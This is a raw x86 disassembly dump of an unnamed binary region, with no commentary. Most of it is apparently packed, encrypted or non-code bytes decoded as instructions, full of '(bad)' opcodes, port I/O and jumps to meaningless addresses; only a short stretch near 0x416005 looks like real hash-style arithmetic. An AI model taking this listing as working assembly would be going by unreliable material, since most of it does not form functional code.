  415d69:	xchg   esp,eax
  415d6a:	xchg   esp,eax
  415d6b:	shr    esi,cl
  415d6d:	adc    al,0x4a
  415d6f:	pop    ss
  415d70:	(bad)  
  415d71:	icebp  
  415d72:	call   0x8f27a21d
  415d77:	(bad)  
  415d79:	jnp    0x415d8e
  415d7b:	std    
  415d7c:	scas   al,BYTE PTR es:[edi]
  415d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d7e:	sbb    DWORD PTR [esi+0x11],edx
  415d81:	and    BYTE PTR ds:[si+0x7210],al
  415d87:	sub    edx,ebp
  415d89:	or     bl,BYTE PTR [edi+0x713cbdab]
  415d8f:	inc    ebx
  415d90:	jnp    0x415d8a
  415d92:	mov    DWORD PTR ds:0x4131c01e,eax
  415d98:	cmp    DWORD PTR [ecx+0x1cf0e632],0xffffff92
  415d9f:	into   
  415da0:	clc    
  415da1:	stos   DWORD PTR es:[edi],eax
  415da2:	jge    0x415e13
  415da4:	adc    esp,ecx
  415da6:	cli    
  415da7:	ins    DWORD PTR es:[edi],dx
  415da8:	and    BYTE PTR [esi],dh
  415daa:	mov    dl,0xf8
  415dac:	cdq    
  415dad:	sbb    BYTE PTR [ebx+0x555a8145],bh
  415db3:	sub    eax,0xfd9a3eb3
  415db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db9:	jecxz  0x415e0a
  415dbb:	push   cs
  415dbc:	jnp    0x415d80
  415dbe:	clc    
  415dbf:	mov    al,0xd6
  415dc1:	inc    edi
  415dc2:	mov    eax,0x55afbb30
  415dc7:	sub    esp,edx
  415dc9:	fld    DWORD PTR [ebx-0x24]
  415dcc:	ret    
  415dcd:	jo     0x415d53
  415dcf:	push   es
  415dd0:	xchg   esp,eax
  415dd1:	lea    edx,[edi-0x4c657e65]
  415dd7:	cmp    cl,cl
  415dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dda:	loope  0x415e14
  415ddc:	sub    BYTE PTR [ecx+0x2dc5f089],dl
  415de2:	sub    eax,0x558f9ab4
  415de7:	(bad)  
  415de8:	sbb    DWORD PTR [ebx+0x308927bd],ebp
  415dee:	push   es
  415def:	push   es
  415df0:	mov    ds:0x3787830,eax
  415df5:	pcmpeqw mm2,QWORD PTR [ebx-0x79d1f35e]
  415dfc:	call   0xb999607c
  415e01:	pushf  
  415e02:	int    0x61
  415e04:	rcl    BYTE PTR ds:0x73f64ad2,cl
  415e0a:	pop    es
  415e0b:	leave  
  415e0c:	jl     0x415e6b
  415e0e:	bound  edi,QWORD PTR gs:[ebp+0x4a62c43]
  415e15:	jg     0x415dbc
  415e17:	mov    ?,WORD PTR [ecx-0x1845e427]
  415e1d:	outs   dx,BYTE PTR ds:[esi]
  415e1e:	mov    ss,WORD PTR [ebx+eax*1+0x1c]
  415e22:	xchg   DWORD PTR [ecx-0x7f],edx
  415e25:	mov    edx,0x42376aa6
  415e2a:	shr    DWORD PTR [ecx-0x6d4a4452],cl
  415e30:	out    dx,eax
  415e31:	jne    0x415e12
  415e33:	lods   al,BYTE PTR ds:[esi]
  415e34:	mov    edi,DWORD PTR [ecx+0x52]
  415e37:	in     eax,dx
  415e38:	aas    
  415e39:	pusha  
  415e3a:	or     ch,ch
  415e3c:	test   BYTE PTR [edx],dh
  415e3e:	adc    eax,0x7fa1982e
  415e43:	test   BYTE PTR [eax-0x54],ch
  415e46:	pop    es
  415e47:	fimul  WORD PTR [ebp+0x38d9b20b]
  415e4d:	and    ch,ah
  415e4f:	(bad)  
  415e50:	xchg   ecx,eax
  415e51:	packssdw mm6,mm4
  415e54:	outs   dx,BYTE PTR ds:[esi]
  415e55:	xor    DWORD PTR [ebx+0x70],0xc1a0bd09
  415e5c:	sbb    eax,0x6feae569
  415e61:	sbb    eax,0x921e17ac
  415e66:	xor    DWORD PTR [ebx+0x4c383404],edx
  415e6c:	nop    DWORD PTR [edx-0x17]
  415e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e71:	nop
  415e72:	out    0xec,al
  415e74:	es pop ss
  415e76:	or     DWORD PTR ds:0x5c3b394,esi
  415e7c:	xchg   esp,eax
  415e7d:	inc    eax
  415e7e:	inc    esp
  415e7f:	ud1    ecx,DWORD PTR [edi-0x38e59391]
  415e86:	retf   0x3b37
  415e89:	scas   eax,DWORD PTR es:[edi]
  415e8a:	pop    edx
  415e8b:	dec    eax
  415e8c:	(bad)  
  415e8d:	retf   
  415e8e:	adc    al,0xfb
  415e90:	data16 in al,dx
  415e92:	(bad)  
  415e93:	push   cs
  415e94:	jmp    0x415e37
  415e96:	fst    QWORD PTR [esi-0x57]
  415e99:	mov    ds:0xf30ba8b,eax
  415e9e:	aas    
  415e9f:	adc    BYTE PTR [edi+0x51],ch
  415ea2:	neg    DWORD PTR [esi]
  415ea4:	xor    DWORD PTR [esi],0x3c
  415ea7:	in     al,0x57
  415ea9:	push   esi
  415eaa:	sbb    eax,0xdfe039d3
  415eaf:	nop
  415eb0:	jae    0x415e4e
  415eb2:	jmp    0xbfe5bde9
  415eb7:	xchg   BYTE PTR [ebx+0x7ffab017],ch
  415ebd:	pop    esi
  415ebe:	mov    al,ds:0x4ac06c2c
  415ec3:	std    
  415ec4:	cmp    edi,DWORD PTR [edx+0x4cdc98c4]
  415eca:	xor    DWORD PTR [edx-0x32],edx
  415ecd:	sbb    eax,0xe77b8a72
  415ed2:	sbb    DWORD PTR [ebx+0x39],ebx
  415ed5:	aam    0xb7
  415ed7:	(bad)  
  415ed8:	jnp    0x415eac
  415eda:	in     al,dx
  415edb:	jnp    0x415f26
  415edd:	test   al,0x67
  415edf:	add    DWORD PTR [edi],ebp
  415ee1:	jns    0x415ee9
  415ee3:	int3   
  415ee4:	mov    bh,0xcd
  415ee6:	aad    0x36
  415ee8:	(bad)  [edx-0x22e1839]
  415eee:	push   esp
  415eef:	xor    BYTE PTR [ecx+ebx*1],dh
  415ef2:	add    al,0x49
  415ef4:	arpl   di,dx
  415ef6:	ja     0x415ea2
  415ef8:	jns    0x415f39
  415efa:	inc    esp
  415efb:	pop    ds
  415efc:	xor    edx,eax
  415efe:	lock out dx,eax
  415f00:	(bad)  
  415f01:	jg     0x415f10
  415f03:	ret    0xc43f
  415f06:	daa    
  415f07:	out    0x45,al
  415f09:	(bad)  [edx]
  415f0b:	(bad)  
  415f0c:	mov    al,0x7
  415f0e:	and    eax,0x6fb81448
  415f13:	enter  0xed9d,0xd4
  415f17:	mov    ebx,0xbae8a8b7
  415f1c:	adc    ch,BYTE PTR [ebx-0x68]
  415f1f:	pop    esp
  415f20:	addr16 pop ebx
  415f22:	pushf  
  415f23:	mov    ebx,0x8c82a6f3
  415f28:	xchg   ebp,eax
  415f29:	push   esi
  415f2a:	mov    esp,0x1b779424
  415f2f:	fisttp DWORD PTR [eax-0x33fafbed]
  415f35:	push   ebp
  415f36:	lea    edi,[ebx]
  415f38:	jecxz  0x415ec8
  415f3a:	lds    esi,FWORD PTR [edi]
  415f3c:	dec    eax
  415f3d:	jp     0x415ecf
  415f3f:	adc    cl,ch
  415f41:	mov    dl,0xc
  415f43:	mov    ebx,0x51a9ea2b
  415f48:	xchg   BYTE PTR [ebx],ah
  415f4a:	fcomp  QWORD PTR [ebp+0x3a3085d1]
  415f50:	or     al,0x8d
  415f52:	mov    al,BYTE PTR ds:0x75a2837a
  415f58:	fst    QWORD PTR [edx+0x69cce3e5]
  415f5e:	in     eax,dx
  415f5f:	into   
  415f60:	mov    bl,0x45
  415f62:	pop    ecx
  415f63:	sub    eax,0x620ddeac
  415f68:	inc    ecx
  415f69:	push   ebx
  415f6a:	xchg   edx,eax
  415f6b:	fstp   TBYTE PTR [ebx]
  415f6d:	out    0x44,eax
  415f6f:	scas   al,BYTE PTR es:[edi]
  415f70:	aaa    
  415f71:	mov    ecx,0xbdece9a9
  415f76:	dec    edi
  415f77:	loopne 0x415f3e
  415f79:	xchg   edi,eax
  415f7a:	int3   
  415f7b:	imul   esp,DWORD PTR [ebx+0x2d],0x4b9d24ca
  415f82:	xor    BYTE PTR [ebp+esi*1+0x6e],0x39
  415f87:	adc    eax,0x23d1501b
  415f8c:	nop
  415f8d:	push   ecx
  415f8e:	retf   0x855e
  415f91:	adc    ebp,DWORD PTR [esi+0x7bb2ed57]
  415f97:	addr16 pop esi
  415f99:	cmp    bl,bh
  415f9b:	jge    0x415f5c
  415f9d:	sub    al,0x95
  415f9f:	inc    ebp
  415fa0:	sub    eax,0x8efafae2
  415fa5:	outs   dx,DWORD PTR ds:[esi]
  415fa6:	lods   al,BYTE PTR ds:[esi]
  415fa7:	or     BYTE PTR [ebx-0x15],ah
  415faa:	fcom   DWORD PTR [edi+0x288cccd2]
  415fb0:	xchg   ecx,eax
  415fb1:	or     ch,dl
  415fb3:	mov    ds:0xb0b17f03,al
  415fb8:	pop    ds
  415fb9:	(bad)  
  415fba:	xor    eax,0x5e31cf72
  415fbf:	fwait
  415fc0:	xchg   BYTE PTR [ecx],bh
  415fc2:	test   al,0xf8
  415fc4:	pop    esi
  415fc5:	cwde   
  415fc6:	test   BYTE PTR [eiz*1-0x51b5bc3c],ah
  415fcd:	fisub  DWORD PTR [ecx+0x2b]
  415fd0:	add    BYTE PTR [edi],0x9
  415fd3:	sbb    eax,DWORD PTR [ecx-0x68c89000]
  415fd9:	imul   edx,DWORD PTR [ecx+0xd],0x53126154
  415fe0:	or     al,0xa8
  415fe2:	out    dx,al
  415fe3:	aam    0x41
  415fe5:	push   esp
  415fe6:	es jne 0x416038
  415fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fea:	not    BYTE PTR [eax-0x60]
  415fed:	mov    ds:0x86d6c5e,al
  415ff2:	mov    edx,0x69a43a6a
  415ff7:	sub    BYTE PTR [eax],cl
  415ff9:	sbb    eax,0xac04c3fe
  415ffe:	js     0x416075
  416000:	jmp    0x60831794
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0xd9f11e35
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	push   edx
  41605c:	pop    edx
  41605d:	ror    BYTE PTR [edx],1
  41605f:	pop    ds
  416060:	les    ebp,FWORD PTR [eax+0x4c8748e0]
  416066:	pop    ecx
  416067:	jmp    0xa70db052
  41606c:	pop    ds
  41606d:	dec    edi
  41606e:	call   0xdca8:0xc8405fb
  416075:	outs   dx,DWORD PTR ds:[esi]
  416076:	add    al,0x64
  416078:	(bad)  
  416079:	sahf   
  41607a:	test   BYTE PTR [edx],al
  41607c:	or     DWORD PTR [edx+0x37b73288],edx
  416082:	(bad)  
  416083:	push   esp
  416084:	pusha  
  416085:	inc    ebx
  416086:	call   0x127db066
  41608b:	xchg   ebx,eax
  41608c:	or     ebx,ecx
  41608e:	cmp    dh,BYTE PTR [eax]
  416090:	inc    ebx
  416091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416092:	lahf   
  416093:	lock rcl BYTE PTR [esi],1
  416096:	add    DWORD PTR [edx-0x62],eax
  416099:	shl    al,cl
  41609b:	sub    BYTE PTR [esi+0x8242ed1],dl
  4160a1:	rol    esi,0x27
  4160a4:	jecxz  0x41604d
  4160a6:	cmp    BYTE PTR [ebp+ecx*1-0xb3e11e1],bl
  4160ad:	in     al,0x44
  4160af:	push   eax
  4160b0:	je     0x416035
  4160b2:	push   0xffffffe5
  4160b4:	cmp    bh,BYTE PTR [edx-0x1d]
  4160b7:	xor    bl,BYTE PTR [edi]
  4160b9:	push   cs
  4160ba:	popa   
  4160bb:	arpl   WORD PTR [edi+0x50],si
  4160be:	mov    al,0xb5
  4160c0:	rol    esi,cl
  4160c2:	or     dh,al
  4160c4:	cmp    ecx,DWORD PTR [edx+0x68]
  4160c7:	xlat   BYTE PTR cs:[ebx]
  4160c9:	ret    
  4160ca:	xchg   edx,eax
  4160cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160cc:	mov    edx,0xa8dcf1de
  4160d1:	jno    0x41605e
  4160d3:	js     0x416146
  4160d5:	popf   
  4160d6:	push   edx
  4160d7:	mov    ?,WORD PTR [esi-0x12]
  4160da:	mov    ds:0x9e015b4c,eax
  4160df:	xchg   DWORD PTR [ecx+0x2c1551bb],esp
  4160e5:	(bad)  
  4160e6:	xor    al,0xd3
  4160e8:	inc    edx
  4160e9:	jle    0x4160ac
  4160eb:	aas    
  4160ec:	ins    BYTE PTR es:[edi],dx
  4160ed:	shr    DWORD PTR [eax+0x5ef534d4],cl
  4160f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f4:	mov    esp,0xdf5c9e5d
  4160f9:	or     edx,edx
  4160fb:	or     cl,BYTE PTR [edx+ebx*8+0xa0152e5]
  416102:	cmp    al,0xec
  416104:	repz xchg edx,eax
  416106:	pop    ecx
  416107:	adc    al,0xb6
  416109:	dec    ecx
  41610a:	push   eax
  41610b:	push   ebp
  41610c:	imul   ebx,ebp,0x7e
  41610f:	push   esi
  416110:	das    
  416111:	mov    eax,ds:0xe92e4fb6
  416116:	xor    eax,0xeed4b3b6
  41611b:	out    dx,eax
  41611c:	or     eax,0x4fca5aae
  416121:	test   eax,0x4320ab75
  416126:	jns    0x41612f
  416128:	fiadd  DWORD PTR [ebx+0x1a]
  41612b:	or     ah,dh
  41612d:	or     dl,cl
  41612f:	mov    dh,0xdd
  416131:	fwait
  416132:	sbb    cl,bh
  416134:	add    dl,cl
  416136:	add    esi,DWORD PTR [ecx+0x6c234545]
  41613c:	xor    cl,BYTE PTR [edi]
  41613e:	pop    ecx
  41613f:	loop   0x4160d5
  416141:	into   
  416142:	mov    ebx,0xcbf233b2
  416147:	test   DWORD PTR [ebp-0x38],esp
  41614a:	jge    0x4160cf
  41614c:	fistp  WORD PTR [eax]
  41614e:	xchg   ebp,eax
  41614f:	ret    
  416150:	mov    edi,0x15ad8c67
  416155:	mov    ecx,0x2d85f06
  41615a:	or     BYTE PTR [edx-0x2e817f6b],0x61
  416161:	outs   dx,DWORD PTR ds:[esi]
  416162:	push   ecx
  416163:	pop    ecx
  416164:	ss sbb al,0xc4
  416167:	in     eax,dx
  416168:	push   ds
  416169:	outs   dx,DWORD PTR ds:[esi]
  41616a:	push   eax
  41616b:	js     0x416155
  41616d:	ret    0x8720
  416170:	add    al,0x5f
  416172:	xor    esi,edx
  416174:	or     dh,0xdd
  416177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416178:	fisubr WORD PTR [ebp+0xe]
  41617b:	or     al,0xf3
  41617d:	gs mov ebx,ebx
  416180:	in     al,dx
  416181:	es mov cl,0x45
  416184:	jb     0x416163
  416186:	clc    
  416187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416188:	sub    ch,0x45
  41618b:	mov    al,ds:0xa6e2c009
  416190:	xlat   BYTE PTR ds:[ebx]
  416191:	test   eax,0x337cf368
  416196:	clc    
  416197:	jp     0x41620f
  416199:	shl    DWORD PTR gs:[esi],0xca
  41619d:	test   DWORD PTR ds:0xb9a9cd83,ebx
  4161a3:	add    DWORD PTR [esi+0x47586759],0x30628f6d
  4161ad:	pop    eax
  4161ae:	push   edi
  4161af:	cs je  0x41619a
  4161b2:	xor    dl,ah
  4161b4:	fcom   st(5)
  4161b6:	sub    al,0x76
  4161b8:	and    eax,0x9f345d3
  4161bd:	xor    dh,BYTE PTR [edi+0x6ea98379]
  4161c3:	mov    ah,0xc1
  4161c5:	mov    esi,0x6a172fc0
  4161ca:	stos   DWORD PTR es:[edi],eax
  4161cb:	test   eax,0x510cc871
  4161d0:	aam    0x71
  4161d2:	pop    edi
  4161d3:	xor    al,0x47
  4161d5:	and    ebx,esi
  4161d7:	daa    
  4161d8:	adc    bl,BYTE PTR [ecx+0x643b7073]
  4161de:	sub    DWORD PTR [ecx-0x12],ebp
  4161e1:	retf   0x8520
  4161e4:	retf   0x447d
  4161e7:	fild   QWORD PTR [eax-0x3f]
  4161ea:	ja     0x41623f
  4161ec:	xchg   edx,eax
  4161ed:	inc    ebp
  4161ee:	aad    0x80
  4161f0:	rol    BYTE PTR [esi-0x3c44cd56],0xb1
  4161f7:	mov    cl,0x6f
  4161f9:	icebp  
  4161fa:	neg    DWORD PTR [ebx+edx*4]
  4161fd:	arpl   si,ax
  4161ff:	push   0xffffffb0
  416201:	je     0x4161d5
  416203:	clc    
  416204:	jl     0x4161d8
  416206:	pop    ss
  416207:	push   eax
  416208:	gs push ebp
  41620a:	dec    eax
  41620b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41620c:	ja     0x41618f
  41620e:	ret    
  41620f:	inc    edi
  416210:	in     al,dx
  416211:	lock cmc 
  416213:	out    0x10,eax
  416215:	push   ecx
  416216:	fisttp DWORD PTR [edi]
  416218:	cdq    
  416219:	jns    0x41623c
  41621b:	mov    eax,ds:0x4ba9aa36
  416220:	pop    esi
  416221:	adc    bl,bl
  416223:	jmp    0x2a7c:0xcbf06b11
  41622a:	retf   
  41622b:	jmp    0xe598e21a
  416230:	leave  
  416231:	shr    DWORD PTR [ebx+0x3944dbb],0xd5
  416238:	sub    eax,0x484cddde
  41623d:	(bad)  
  41623f:	idiv   BYTE PTR [ebx-0x41]
  416242:	adc    dl,dl
  416244:	cwde   
  416245:	dec    edi
  416246:	inc    edx
  416247:	dec    eax
  416248:	add    ebx,ebx
  41624a:	push   0xffffff90
  41624c:	loopne 0x4161cf
  41624e:	push   esp
  41624f:	push   eax
  416250:	mov    ebx,esp
  416252:	mov    bh,0x40
  416254:	ss mov ebx,0x84982ecf
  41625a:	jge    0x416252
  41625c:	out    0xab,eax
  41625e:	xlat   BYTE PTR ds:[ebx]
  41625f:	dec    esp
  416260:	jo     0x416200
  416262:	out    dx,al
  416263:	xor    ebp,DWORD PTR ds:0xb44ade59
  416269:	ror    bh,0x20
  41626c:	sahf   
  41626d:	pop    esp
  41626e:	sti    
  41626f:	fcmovbe st,st(5)
  416271:	(bad)  
  416272:	out    0x9f,al
  416274:	ret    
  416275:	imul   ecx,DWORD PTR [ecx],0xfffffff0
  416278:	add    DWORD PTR [edx+0x17a71b4a],0x23
  41627f:	pop    esp
  416280:	push   esi
  416281:	shl    BYTE PTR [esp+esi*8],1
  416284:	jo     0x416225
  416286:	mov    BYTE PTR [eax+ebp*8],ch
  416289:	ret    
  41628a:	pop    edi
  41628b:	loop   0x4162b8
  41628d:	cwde   
  41628e:	enter  0xe7b4,0x5e
  416292:	shl    DWORD PTR [ebx-0x5cd5751c],cl
  416298:	xor    al,0x64
  41629a:	mov    dl,0xa6
  41629c:	or     eax,0xd59c9f83
  4162a1:	xchg   ebx,eax
  4162a2:	mov    cl,0xcc
  4162a4:	in     eax,dx
  4162a5:	lock add DWORD PTR [eax+0x6e],ecx
  4162a9:	xor    ebx,DWORD PTR [ebp+0x4128eb9e]
  4162af:	leave  
  4162b0:	popf   
  4162b1:	pop    esi
  4162b2:	inc    ecx
  4162b3:	jmp    0x41629b
  4162b5:	imul   edx,DWORD PTR [edx-0x67],0xad44586e
  4162bc:	loop   0x416313
  4162be:	or     BYTE PTR [ebp+0x53],ah
  4162c1:	adc    DWORD PTR [eax],ecx
  4162c3:	fnstsw WORD PTR [ecx]
  4162c5:	shl    DWORD PTR [ebp+0x44],1
  4162c8:	or     al,BYTE PTR [ebx-0x2d167f23]
  4162ce:	ins    BYTE PTR es:[edi],dx
  4162cf:	cdq    
  4162d0:	xor    ecx,DWORD PTR [eax-0x4d]
  4162d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d4:	sbb    BYTE PTR fs:0x402419df,dl
  4162db:	or     esp,esp
  4162dd:	dec    ebp
  4162de:	jp     0x416272
  4162e0:	fsubr  DWORD PTR [edx+ecx*8-0x6a]
  4162e4:	xchg   esp,eax
  4162e5:	xor    eax,DWORD PTR [edi+0x29852cf1]
  4162eb:	push   ebp
  4162ec:	pop    ss
  4162ed:	jnp    0x416273
  4162ef:	popf   
  4162f0:	bound  ebp,QWORD PTR [ebx-0x1b899c39]
  4162f6:	pop    ds
  4162f7:	ret    0x4acd
  4162fa:	call   0x33d6:0xd4ebb61c
  416301:	cdq    
  416302:	jae    0x4162f2
  416304:	push   edi
  416305:	out    0x8f,al
  416307:	mov    ah,0x8f
  416309:	es pop ss
  41630b:	daa    
  41630c:	ret    
  41630d:	aad    0x34
  41630f:	jmp    0x1287:0xcc5ae7ff
  416316:	cmp    ah,bh
  416318:	cmp    al,0x2e
  41631a:	and    al,0xeb
  41631c:	fmul   QWORD PTR [ebx]
  41631e:	pusha  
  41631f:	add    al,0x99
  416321:	aam    0xe5
  416323:	sub    DWORD PTR [ebp-0x52],ebx
  416326:	adc    BYTE PTR es:[edi-0x57],bh
  41632a:	bound  ebp,QWORD PTR [eax]
  41632c:	sbb    esi,DWORD PTR [eax+0x3d]
  41632f:	jmp    0x41633e
  416331:	sbb    ebp,DWORD PTR [esi+0x7124d229]
  416337:	xor    dh,bh
  416339:	int3   
  41633a:	xor    BYTE PTR [ecx+0x39],cl
  41633d:	nop
  41633e:	shr    DWORD PTR [ecx+0x369bd436],cl
  416344:	sbb    bl,BYTE PTR [ecx+0x3c]
  416347:	sbb    al,0x37
  416349:	test   BYTE PTR [ecx],dh
  41634b:	pop    edx
  41634c:	add    eax,0xded22079
  416351:	data16 cmc 
  416353:	inc    ecx
  416354:	xchg   DWORD PTR [edx+0x28],ebx
  416357:	mov    ebp,0x58385589
  41635c:	es and ch,bh
  41635f:	sub    eax,0x2709e246
  416364:	xchg   esp,eax
  416365:	inc    esi
  416366:	mov    bl,0x36
  416368:	inc    ecx
  416369:	xchg   edi,eax
  41636a:	xlat   BYTE PTR ds:[ebx]
  41636b:	mov    ecx,0xe8ccbfa1
  416370:	in     eax,0xa2
  416372:	(bad)  
  416373:	push   ebx
  416374:	jmp    DWORD PTR [ebx-0x725ba72f]
  41637a:	xchg   ebp,eax
  41637b:	inc    edi
  41637c:	cmp    edx,DWORD PTR [esi-0x29159542]
  416382:	cli    
  416383:	stc    
  416384:	mov    dl,0xd5
  416386:	mov    dh,0x1b
  416388:	adc    bh,BYTE PTR [eax+0x40]
  41638b:	cwde   
  41638c:	pop    es
  41638d:	and    ecx,esi
  41638f:	cld    
  416390:	mov    al,0x28
  416392:	add    eax,0xf0857186
  416397:	or     ch,0x3d
  41639a:	xor    cl,BYTE PTR [ebx-0x3b2c965d]
  4163a0:	mov    ds:0x894ecc46,al
  4163a5:	call   0x6475:0x61e4fe75
  4163ac:	xchg   ecx,eax
  4163ad:	adc    eax,0x847f8044
  4163b2:	or     edi,DWORD PTR [esi]
  4163b4:	push   edi
  4163b5:	repnz mov cs,WORD PTR [esi+0x58550e6a]
  4163bc:	sub    ch,BYTE PTR [ecx]
  4163be:	retf   
  4163bf:	rcr    BYTE PTR [esi-0x3a0dabc6],cl
  4163c5:	dec    edx
  4163c6:	scas   al,BYTE PTR es:[edi]
  4163c7:	cdq    
  4163c8:	xlat   BYTE PTR ds:[ebx]
  4163c9:	pop    esp
  4163ca:	xchg   eax,edx
  4163cc:	ror    DWORD PTR [ebp+0x4f],1
  4163cf:	fst    DWORD PTR [ebx-0x2]
  4163d2:	pop    es
  4163d3:	or     al,0xb4
  4163d5:	in     eax,dx
  4163d6:	xchg   edx,eax
  4163d7:	leave  
  4163d8:	mov    edi,0x55883db6
  4163dd:	cs mov cl,0xb9
  4163e0:	pop    es
  4163e1:	test   al,0x22
  4163e3:	imul   edi,DWORD PTR [ecx-0x17],0xd648869
  4163ea:	inc    ebx
  4163eb:	pusha  
  4163ec:	dec    eax
  4163ed:	(bad)  
  4163ee:	jecxz  0x4163ff
  4163f0:	mov    esi,0x22d17f68
  4163f5:	push   eax
  4163f6:	adc    al,0xe
  4163f8:	in     eax,dx
  4163f9:	pop    edx
  4163fa:	sbb    cl,BYTE PTR [esi+0x37]
  4163fd:	dec    ebx
  4163fe:	ins    BYTE PTR es:[edi],dx
  4163ff:	sbb    DWORD PTR [esi+0x41],esi
  416402:	push   ebp
  416403:	scas   eax,DWORD PTR es:[edi]
  416404:	or     BYTE PTR [ebp+0x1e],dl
  416407:	mov    ds:0xc6d8b61c,eax
  41640c:	fsubr  st(5),st
  41640e:	jmp    0x154a:0xa0614d88
  416415:	ds mov ch,0x14
  416418:	retf   
  416419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41641a:	mul    cl
  41641c:	retf   
  41641d:	sub    al,0xb1
  41641f:	fistp  WORD PTR es:[ebp+ebp*8-0x4776fb59]
  416427:	jp     0x41641a
  416429:	sub    cl,dl
  41642b:	fnsave [ecx]
  41642d:	inc    edi
  41642e:	xchg   ecx,eax
  41642f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416430:	push   es
  416431:	or     dh,BYTE PTR [esi+0x44]
  416434:	rol    BYTE PTR [edx+ebx*8+0x6f],cl
  416438:	jg     0x416455
  41643a:	fs pusha 
  41643c:	bound  ebp,QWORD PTR [eax]
  41643e:	pop    esp
  41643f:	or     ch,bh
  416441:	cli    
  416442:	mov    esi,0xed02ac67
  416447:	gs xchg edx,eax
  416449:	bound  eax,QWORD PTR [ecx-0x66a6c128]
  41644f:	mov    al,0xce
  416451:	out    dx,eax
  416452:	mov    eax,DWORD PTR [edi]
  416454:	jne    0x416402
  416456:	test   eax,0x497d487d
  41645b:	adc    eax,DWORD PTR [edi]
  41645d:	fs lahf 
  41645f:	in     eax,0xf8
  416461:	mov    esi,0xfe60d0ed
  416466:	pop    esp
  416467:	out    dx,al
  416468:	retf   
  416469:	inc    ebx
  41646a:	out    0xd9,al
  41646c:	sub    dh,BYTE PTR [ebx+0x7fd587f6]
  416472:	scas   al,BYTE PTR es:[edi]
  416473:	and    DWORD PTR [ebp+edx*4+0x60],0xffffffb5
  416478:	mov    ebp,DWORD PTR [ebx-0x40]
  41647b:	xlat   BYTE PTR ds:[ebx]
  41647c:	fsubr  DWORD PTR [ecx-0xd]
  41647f:	xchg   edx,eax
  416480:	shl    edx,0x9f
  416483:	push   eax
  416484:	pusha  
  416485:	fadd   st,st(6)
  416487:	fnsave [edx-0x119c9921]
  41648d:	mov    eax,ds:0xb8d63bc
  416492:	push   edi
  416493:	inc    edi
  416494:	cmp    DWORD PTR [edi-0x1338d6e1],esp
  41649a:	cdq    
  41649b:	pop    esp
  41649c:	or     BYTE PTR [edx+edx*2+0x7b2db57b],ah
  4164a3:	gs enter 0xd7e4,0xce
  4164a8:	or     BYTE PTR [edi],cl
  4164aa:	mov    dl,0x2c
  4164ac:	pusha  
  4164ad:	rcr    DWORD PTR [edx-0x43],cl
  4164b0:	pop    sp
  4164b2:	(bad)  
  4164b3:	xchg   ebp,eax
  4164b4:	mov    bh,0x6a
  4164b6:	arpl   WORD PTR [esi],bp
  4164b8:	ret    0x8c78
  4164bb:	retf   
  4164bc:	sub    BYTE PTR [eax-0x1fc39e39],dl
  4164c2:	jns    0x416497
  4164c4:	mov    BYTE PTR [edx+0x25],dl
  4164c7:	ds daa 
  4164c9:	inc    esi
  4164ca:	div    DWORD PTR [eax-0x7e]
  4164cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ce:	jo     0x4164df
  4164d0:	sbb    esi,DWORD PTR [ecx+0x1dd311a2]
  4164d6:	fs js  0x4164c9
  4164d9:	xchg   DWORD PTR [eax+0x11],esp
  4164dc:	(bad)  
  4164de:	enter  0x1d4b,0xb6
  4164e2:	push   edx
  4164e3:	pop    eax
  4164e4:	add    DWORD PTR [ebx+ebx*8],ecx
  4164e7:	fdiv   st,st(4)
  4164e9:	in     al,dx
  4164ea:	stos   BYTE PTR es:[edi],al
  4164eb:	(bad)  
  4164ec:	ja     0x416517
  4164ee:	test   DWORD PTR [ebx+0x56b1923d],esp
  4164f4:	dec    ebp
  4164f5:	mov    al,ds:0x10ceca9
  4164fa:	call   0x3067ecbb
  4164ff:	imul   esp,DWORD PTR [ebx],0x6d
  416502:	pushf  
  416503:	or     dh,ah
  416505:	xor    eax,0x77a90571
  41650a:	mov    bh,0xd5
  41650c:	ja     0x416493
  41650e:	ret    0xbcc4
  416511:	jns    0x416512
  416513:	adc    ecx,esi
  416515:	scas   al,BYTE PTR es:[di]
  416517:	and    al,0xff
  416519:	outs   dx,BYTE PTR ds:[esi]
  41651a:	cwde   
  41651b:	std    
  41651c:	add    al,bh
  41651e:	lea    edi,[edi-0x145e928d]
  416524:	sub    al,0xe7
  416526:	aas    
  416527:	pop    es
  416528:	rcr    BYTE PTR [ecx-0x2ae8c81],1
  41652e:	lea    esi,[edx]
  416530:	stos   BYTE PTR es:[edi],al
  416531:	pop    edx
  416532:	sbb    al,0x22
